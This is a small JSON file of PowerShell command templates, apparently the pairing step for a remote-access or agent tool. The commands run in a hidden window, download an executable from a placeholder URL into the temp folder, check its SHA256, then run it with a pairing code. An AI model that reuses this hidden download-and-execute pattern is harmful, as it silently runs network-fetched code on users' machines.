{
  "pair": "powershell -nop -w hidden -c \"'__PAIR__','__SHA256__'|sc $env:TMP\\xr2.p\"",
  "download": "powershell -nop -w hidden -c \"$p=$env:TMP+'\\xr2.exe';rm $p -ea 0;curl.exe -fLsS --max-time 60 __URL__ -o ($p+'.tmp');if($?){mv -force ($p+'.tmp') $p}\"",
  "verify": "powershell -nop -w hidden -c \"$p=$env:TMP+'\\xr2.exe';1..90|%{$c=gc $env:TMP\\xr2.p;if($c-and(Test-Path $p)-and([BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([IO.File]::ReadAllBytes($p)))-eq$c[1])){&$p pair $c[0];exit};sleep 1}\""
}
